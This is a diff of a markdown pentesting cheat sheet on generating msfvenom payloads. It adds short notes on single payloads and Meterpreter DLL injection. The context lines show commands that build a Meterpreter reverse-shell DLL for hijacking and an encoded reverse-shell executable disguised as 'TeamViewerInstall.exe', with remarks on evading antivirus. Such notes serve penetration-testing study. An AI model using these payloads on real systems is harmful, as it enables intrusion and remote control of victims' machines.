@@ -38,6 +38,8 @@ msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
 
 ```
 
+## Single  payload
+`Singles` are self-contained payloads. Some exploits will not support the resulting size of these payloads as they can get quite large.
 
 ## Staged payload
 
@@ -60,7 +62,7 @@ When creating a staged payload, you will need to use a metasploit handler (explo
 
 ## Stagedless payload
 
-A stage less payload is a standalone program that does not need anything aditional (no metasploit connection), just the netcat listener on the computer.
+A stage less payload is a standalone program that does not need anything adittional (no metasploit connection), just the netcat listener on the computer.
 
 ```bash
 # Example of a windows stageless payload
@@ -72,11 +74,14 @@ If the AV was disabled all the user would need to do is double click on the file
 
 ## crafting a DLL file with a webshell
 
+The `Meterpreter` payload is a specific type of multi-faceted payload that uses `DLL injection` to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes.
+
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IPAttacker> LPORT=<4444> -a x86 -f dll > SECUR32.dll
 # -p: for the chosen payload
 # -a: architecture in the victim machine/application
 # -f: format for the output file
+
 ```
 [More about DLL highjacking in thick client applications](thick-applications/tca-attacking-thick-clients-applications.md#how-is-dll-hijacking-perform).
 
@@ -85,8 +90,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IPAttacker> LPORT=<4444> -a x
 
 ```bash
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
-
 # -e: chosen encoder 
+
+
 ```
 
 Shikata Ga Nai encoder will be most likely detected by AV and IDS/IPS. One better option would be to try running it through multiple iterations of the same Encoding scheme:
